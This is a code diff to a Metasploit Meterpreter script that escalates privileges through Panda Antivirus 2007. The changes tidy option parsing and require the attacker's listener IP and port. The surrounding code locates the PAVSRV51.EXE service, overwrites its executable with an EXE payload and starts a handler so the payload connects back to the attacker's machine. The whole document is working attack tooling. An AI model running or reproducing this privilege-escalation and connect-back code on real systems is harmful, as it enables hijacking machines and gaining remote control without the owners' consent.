@@ -20,7 +20,7 @@
 #
 # Options
 #
-opts = Rex::Parser::Arguments.new(
+@exec_opts = Rex::Parser::Arguments.new(
 	"-h"  => [ false,  "This help menu"],
 	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
 	"-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
@@ -29,26 +29,32 @@ opts = Rex::Parser::Arguments.new(
 #
 # Default parameters
 #
+rhost = nil
+rport = nil
 
-rhost = Rex::Socket.source_address("1.2.3.4")
-rport = 4444
+def usage
+	print_status("Panda Antivirus 2007 Privilege Escalation.")
+	print_line(@exec_opts.usage)
+	raise Rex::Script::Completed
+end
 
 #
 # Option parsing
 #
-opts.parse(args) do |opt, idx, val|
+@exec_opts.parse(args) do |opt, idx, val|
 	case opt
-	when "-h"
-		print_status("Panda Antivirus 2007 privilege escalation.")
-		print_line(opts.usage)
-		raise Rex::Script::Completed
-	when "-r"
-		rhost = val
-	when "-p"
-		rport = val.to_i
-	end
+		when "-r"
+			rhost = val
+		when "-p"
+			rport = val.to_i
+		else
+			usage
+		end
 end
-if client.platform =~ /win32|win64/
+
+if rhost.nil? or rport.nil?
+	usage
+elsif client.platform =~ /win32|win64/
 	client.sys.process.get_processes().each do |m|
 
 		if ( m['name'] =~ /PAVSRV51\.EXE/ )
@@ -74,7 +80,6 @@ if client.platform =~ /win32|win64/
 			tempdir = client.fs.file.expand_path("%ProgramFiles%")
 			tempexe = tempdir + "\\Panda Software\\Panda Antivirus 2007\\" + "PAVSRV51.EXE"
 
-
 			print_status("Sending EXE payload '#{tempexe}'.")
 			fd = client.fs.file.new(tempexe, "wb")
 			fd.write(exe)
@@ -95,10 +100,9 @@ if client.platform =~ /win32|win64/
 				'Payload'        => handler.datastore['PAYLOAD'],
 				'RunAsJob'       => true
 			)
-
 		end
 	end
 else
-	print_error("This version of Meterpreter is not supported with this Script!")
+	print_error("This version of Meterpreter is not supported with this script!")
 	raise Rex::Script::Completed
 end
